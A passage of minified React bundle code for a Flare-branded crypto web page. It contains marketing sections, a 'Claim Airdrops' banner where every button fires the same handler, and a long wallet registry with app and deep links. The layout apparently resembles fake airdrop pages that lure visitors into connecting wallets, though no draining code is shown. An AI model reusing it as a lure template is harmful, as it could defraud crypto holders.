                                children: "Offers highly-decentralized price and data feeds to dapps on Flare, without relying on centralized providers."
                            }), S.jsx(gr, {
                                color: "accent",
                                variant: "outlined",
                                className: "mt-8",
                                children: "Learn More"
                            })]
                        }, r[0]))
                    })]
                }), S.jsxs("section", {
                    className: "p-4 md:p-8 my-12 max-w-screen-xl mx-auto",
                    children: [S.jsx("h3", {
                        className: "text-center text-3xl md:text-4xl font-bold",
                        children: "Expanding the utility of blockchain"
                    }), S.jsx("div", {
                        className: "grid grid-cols-1 md:grid-cols-2 gap-2 md:gap-8 mt-6",
                        children: n.map((r, i) => S.jsxs("div", {
                            className: `border rounded-2xl px-3 md:px-6 py-8 text-center cursor-pointer ${i?"md:col-span-1":"md:col-span-2"}`,
                            onClick: e,
                            children: [S.jsx("img", {
                                src: "/images/scalable_smart_contracts.svg",
                                className: "h-20 w-20 rounded-lg mx-auto"
                            }), S.jsx("h4", {
                                className: "font-semibold text-base md:text-lg mt-4",
                                children: r[0]
                            }), S.jsx("p", {
                                className: "text-stone-400 text-sm md:text-base",
                                children: r[1]
                            })]
                        }, i))
                    })]
                }), S.jsxs("section", {
                    className: "p-8 my-12 max-w-screen-xl mx-auto",
                    children: [S.jsx("h3", {
                        className: "text-center text-4xl font-bold",
                        children: "Latest Flare News"
                    }), S.jsx("div", {
                        className: "mt-4 grid grid-cols-1 md:grid-cols-3 gap-6",
                        children: t.map((r, i) => S.jsxs("div", {
                            className: "h-full flex flex-col",
                            children: [S.jsx("img", {
                                className: "w-full h-60",
                                src: r.image
                            }), S.jsxs("div", {
                                className: "px-2 py-2 flex-1 flex flex-col",
                                children: [S.jsx("div", {
                                    className: "flex-1",
                                    children: S.jsx("h3", {
                                        className: "text-2xl mb-3 flex-1 line-clamp-3",
                                        children: r.title
                                    })
                                }), S.jsx("div", {
                                    children: S.jsx("span", {
                                        className: "text-xs px-4 py-2 uppercase rounded-full bg-accent/20 text-accent",
                                        children: r.tags
                                    })
                                })]
                            })]
                        }, i))
                    })]
                }), S.jsx("section", {
                    className: "bg-cover min-h-80 p-8 my-12",
                    style: {
                        backgroundImage: "url(/images/Flare_community_banner.jpg)"
                    },
                    children: S.jsxs("div", {
                        className: "w-3/4 md:w-1/3 pb-24",
                        children: [S.jsx("h3", {
                            className: "text-2xl md:text-3xl mb-4",
                            children: "Multiple Airdrops are available to everyone connected to our tech in interesting ways."
                        }), S.jsx(gr, {
                            label: "Claim Airdrops",
                            color: "accent",
                            onClick: e
                        })]
                    })
                })]
            })
        },
        Xo = {
            haspack: {
                id: "haspack",
                name: "HashPack Wallet"
            },
            banksocial: {
                id: "banksocial",
                name: "BankSocial Wallet"
            },
            "1ce6dae0fea7114845": {
                id: "1ce6dae0fea7114845",
                name: "Binance Smart Chain",
                homepage: "https://www.binance.org/en/smartChain",
                chains: ["eip155:1"]
            },
            "1ce6dae0fea7114844": {
                id: "1ce6dae0fea7114844",
                name: "SafePal Wallet",
                homepage: "https://safepal.io/",
                chains: ["eip155:1"]
            },
            fetchai: {
                id: "fetchai",
                name: "Fetch.ai Wallet"
            },
            bfw192192: {
                id: "bfw192192",
                name: "Bifrost wallet",
                homepage: "https://bifrostwallet.com/",
                chains: ["eip155:1"]
            },
            "0fledge": {
                id: "0fledge",
                name: "Ledger Live"
            },
            zerion: {
                id: "zerion",
                name: "Zerion Wallet"
            },
            okx: {
                id: "okx",
                name: "OKX Wallet"
            },
            shido: {
                id: "shido",
                name: "Shido Wallet"
            },
            xumm2e093bf3: {
                id: "xumm2e093bf3",
                name: "XUMM Wallet",
                homepage: "https://xumm.app/",
                chains: ["eip155:1"]
            },
            "1c08453": {
                id: "1c08453",
                name: "Coinbase Wallet"
            },
            gateweb3: {
                id: "gateweb3",
                name: "GateWeb3 Wallet"
            },
            bitget: {
                id: "bitget",
                name: "BitGet Wallet"
            },
            robinhood: {
                id: "robinhood",
                name: "Robinhood Wallet"
            },
            bybit: {
                id: "bybit",
                name: "ByBit Wallet"
            },
            frontier: {
                id: "frontier",
                name: "Frontier Wallet"
            },
            "1g7023": {
                id: "1g7023",
                name: "Grove Wallet"
            },
            "15473m006": {
                id: "15473m006",
                name: "SafeMoon Wallet"
            },
            14415849: {
                id: "14415849",
                name: "Uniswap Wallet"
            },
            "154174pro": {
                id: "154174pro",
                name: "SaitaPro Wallet"
            },
            "1984670m": {
                id: "1984670m",
                name: "Phantom Wallet"
            },
            "136716n": {
                id: "136716n",
                name: "Enjin Wallet"
            },
            133775474: {
                id: "133775474",
                name: "Polkadot Wallet"
            },
            blockchain: {
                id: "blockchain",
                name: "Blockchain Wallet"
            },
            mew: {
                id: "mew",
                name: "MEW Wallet"
            },
            rabby: {
                id: "rabby",
                name: "Rabby Wallet"
            },
            brise: {
                id: "brise",
                name: "BRISE Wallet"
            },
            "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63": {
                id: "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63",
                name: "D'CENT Wallet",
                homepage: "https://dcentwallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/kr/app/dcent-hardware-wallet/id1447206611",
                    android: "https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "D'CENT",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369": {
                id: "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
                name: "Rainbow",
                homepage: "https://rainbow.me/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "rainbow:",
                    universal: "https://rnbwapp.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Rainbow",
                    colors: {
                        primary: "rgb(0, 30, 89)",
                        secondary: ""
                    }
                }
            },
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": {
                id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
                name: "Trust Wallet",
                homepage: "https://trustwallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/apple-store/id1288339409",
                    android: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "trust:",
                    universal: "https://link.trustwallet.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Trust",
                    colors: {
                        primary: "rgb(51, 117, 187)",
                        secondary: ""
                    }
                }
            },
            cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46: {
                id: "cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46",
                name: "Argent",
                homepage: "https://argent.xyz/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/argent/id1358741926",
                    android: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "argent://app",
                    universal: "https://argent.link/app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Argent",
                    colors: {
                        primary: "rgb(255, 135, 91)",
                        secondary: ""
                    }
                }
            },
            c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96: {
                id: "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
                name: "MetaMask",
                homepage: "https://metamask.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/metamask/id1438144202",
                    android: "https://play.google.com/store/apps/details?id=io.metamask",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "metamask:",
                    universal: "https://metamask.app.link"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "MetaMask",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f: {
                id: "a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f",
                name: "Gnosis Safe Multisig",
                homepage: "https://gnosis-safe.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "https://gnosis-safe.io/app/",
                    ios: "https://apps.apple.com/app/id1515759131",
                    android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Gnosis Safe",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "1ce6dae0fea7114841": {
                id: "1ce6dae0fea7114841",
                name: "Equal",
                homepage: "https://equal.tech/",
                chains: ["eip155:1"]
            },
            "1ce6dae0fea7114842": {
                id: "1ce6dae0fea7114842",
                name: "MEET.ONE",
                homepage: "https://www.meet.one/",
                chains: ["eip155:1"]
            },
            "1ce6dae0fea7114843": {
                id: "1ce6dae0fea7114843",
                name: "MoriX Wallet",
                homepage: "https://morixjp.com/eng/products/walletcard",
                chains: ["eip155:1"]
            },
            brave: {
                id: "brave",
                name: "Brave Wallet"
            },
            venly: {
                id: "venly",
                name: "Venly Wallet"
            },
            f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d: {
                id: "f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d",
                name: "Crypto.com | DeFi Wallet",
                homepage: "https://crypto.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/id1262148500",
                    android: "https://play.google.com/store/apps/details?id=co.mona.android",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "cryptowallet:",
                    universal: "https://wallet.crypto.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Crypto.com",
                    colors: {
                        primary: "rgb(17, 153, 250)",
                        secondary: ""
                    }
                }
            },
            "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c": {
                id: "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c",
                name: "Pillar",
                homepage: "https://pillarproject.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/apple-store/id1346582238",
                    android: "https://play.google.com/store/apps/details?id=com.pillarproject.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "pillarwallet:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Pillar",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2": {
                id: "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2",
                name: "imToken",
                homepage: "https://token.im/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/us/app/imtoken2/id1384798940",
                    android: "https://play.google.com/store/apps/details?id=im.token.app",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "imtokenv2:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "imToken",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137: {
                id: "dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137",
                name: "ONTO",
                homepage: "https://onto.app/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/onto-an-ontology-dapp/id1436009823",
                    android: "https://play.google.com/store/apps/details?id=com.github.ontio.onto",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "ontoprovider:",
                    universal: "https://onto.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "ONTO",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66": {
                id: "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66",
                name: "TokenPocket",
                homepage: "https://tokenpocket.pro/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/tokenpocket-trusted-wallet/id1436028697",
                    android: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "tpoutside:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "TokenPocket",
                    colors: {
                        primary: "rgb(41, 128, 254)",
                        secondary: ""
                    }
                }
            },
            "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26": {
                id: "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26",
                name: "MathWallet",
                homepage: "https://mathwallet.org/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331",
                    android: "https://play.google.com/store/apps/details?id=com.medishares.android",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "mathwallet:",
                    universal: "https://www.mathwallet.org"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "MathWallet",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b: {
                id: "ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b",
                name: "BitPay",
                homepage: "https://bitpay.com",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638",
                    android: "https://play.google.com/store/apps/details?id=com.bitpay.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "bitpay:",
                    universal: "https://bitpay.com/wallet"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "BitPay",
                    colors: {
                        primary: "rgb(26, 59, 139)",
                        secondary: ""
                    }
                }
            },
            "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168": {
                id: "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168",
                name: "Walleth",
                homepage: "https://walleth.org/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "",
                    android: "https://play.google.com/store/apps/details?id=org.walleth",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Walleth",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d": {
                id: "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d",
                name: "Authereum",
                homepage: "https://authereum.org",
                chains: ["eip155:1"],
                app: {
                    browser: "https://authereum.com/i/account",
                    ios: "",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Authereum",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f": {
                id: "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f",
                name: "Dharma",
                homepage: "https://www.dharma.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/dharma-save-send-globally/id1495144415",
                    android: "https://play.google.com/store/apps/details?id=io.dharma.Dharma",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "dharma:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Dharma",
                    colors: {
                        primary: "#0DD675",
                        secondary: "#F5F5F5"
                    }
                }
            },
            "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890": {
                id: "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890",
                name: "1inch Wallet",
                homepage: "https://1inch.io/wallet/",
                chains: ["eip155:1", "eip155:56"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "1inch:",
                    universal: "https://wallet.1inch.io"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "1inch",
                    colors: {
                        primary: "rgb(31, 36, 46)",
                        secondary: ""
                    }
                }
            },
            bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4: {
                id: "bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4",
                name: "Huobi Wallet",
                homepage: "https://huobiwallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/id1433883012",
                    android: "https://play.google.com/store/apps/details?id=com.huobionchainwallet.gp",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "huobiwallet:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Huobi",
                    colors: {
                        primary: "rgb(45,101,248)",
                        secondary: ""
                    }
                }
            },
            efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61: {
                id: "efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61",
                name: "Eidoo",
                homepage: "https://eidoo.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/app/apple-store/id1279896253",
                    android: "https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "eidoo:",
                    universal: "https://eidoo.io/crypto-wallet"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Eidoo",
                    colors: {
                        primary: "rgb(55, 179, 159)",
                        secondary: ""
                    }
                }
            },
            "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e": {
                id: "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e",
                name: "MYKEY",
                homepage: "https://mykey.org",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/app/id1458318224",
                    android: "https://play.google.com/store/apps/details?id=com.mykey.id",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "mykeywalletconnect:",
                    universal: "https://mykey.org"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "MYKEY",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756: {
                id: "dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756",
                name: "Loopring Wallet",
                homepage: "https://loopring.io",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/loopring-smart-wallet/id1550921126",
                    android: "https://play.google.com/store/apps/details?id=loopring.defi.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Loopring",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6": {
                id: "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6",
                name: "TrustVault",
                homepage: "https://trustology.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/apple-store/id1455959680",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "TrustVault",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a": {
                id: "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a",
                name: "Atomic",
                homepage: "https://atomicwallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/atomic-wallet/id1478257827",
                    android: "https://play.google.com/store/apps/details?id=io.atomicwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Atomic",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e: {
                id: "b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e",
                name: "Coin98",
                homepage: "https://coin98.app/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://ios.coin98.app/",
                    android: "https://play.google.com/store/apps/details?id=coin98.crypto.finance.media",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "coin98:",
                    universal: "https://coin98.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Coin98",
                    colors: {
                        primary: "rgb(39,39,39)",
                        secondary: ""
                    }
                }
            },
            "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d": {
                id: "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d",
                name: "CoolWallet S",
                homepage: "https://coolwallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/us/app/coolwallet-s-2018/id1328764142",
                    android: "https://play.google.com/store/apps/details?id=com.coolbitx.cwsapp",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "CoolWallet S",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693: {
                id: "beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693",
                name: "Alice",
                homepage: "https://alicedapp.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/au/app/alice-browser/id1472818028",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Alice",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98": {
                id: "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98",
                name: "AlphaWallet",
                homepage: "https://alphawallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430",
                    android: "https://play.google.com/store/apps/details?id=io.stormbird.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: "https://aw.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "AlphaWallet",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09": {
                id: "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09",
                name: "ZelCore",
                homepage: "https://zel.network",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/zelcore/id1436296839",
                    android: "https://play.google.com/store/apps/details?id=com.zelcash.zelcore",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "zel:",
                    universal: "https://link.zel.network"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "ZelCore",
                    colors: {
                        primary: "rgb(35, 34, 32)",
                        secondary: ""
                    }
                }
            },
            "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14": {
                id: "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14",
                name: "Nash",
                homepage: "https://nash.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/nash-app/id1475759236",
                    android: "https://play.google.com/store/apps/details?id=io.nash.app",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "nash:",
                    universal: "https://nash.io/walletconnect"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Nash",
                    colors: {
                        primary: "rgb(0,82,243)",
                        secondary: ""
                    }
                }
            },
            nova: {
                id: "nova",
                name: "Nova Wallet"
            },
            keplr: {
                id: "keplr",
                name: "Keplr Wallet"
            },
            fox: {
                id: "fox",
                name: "FOX Wallet"
            },
            ronin: {
                id: "ronin",
                name: "Ronin Wallet"
            },
            "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814": {
                id: "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814",
                name: "Coinomi",
                homepage: "https://coinomi.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/app/coinomi-wallet/id1333588809",
                    android: "https://play.google.com/store/apps/details?id=com.coinomi.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Coinomi",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702": {
                id: "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702",
                name: "GridPlus",
                homepage: "https://gridplus.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "GridPlus",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5: {
                id: "a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5",
                name: "CYBAVO Wallet",
                homepage: "https://cybavo.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/tw/app/cybavo-wallet/id1510697681",
                    android: "https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "cybavowallet:",
                    universal: "https://cdn.cybavo.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "CYBAVO",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0: {
                id: "c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0",
                name: "Tokenary",
                homepage: "https://tokenary.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/tokenary-ethereum-wallet/id1372886601",
                    android: "https://play.google.com/store/apps/details?id=com.jufy.tokenary",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Tokenary",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50": {
                id: "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50",
                name: "Torus",
                homepage: "https://toruswallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "https://app.tor.us/",
                    ios: "",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Torus",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
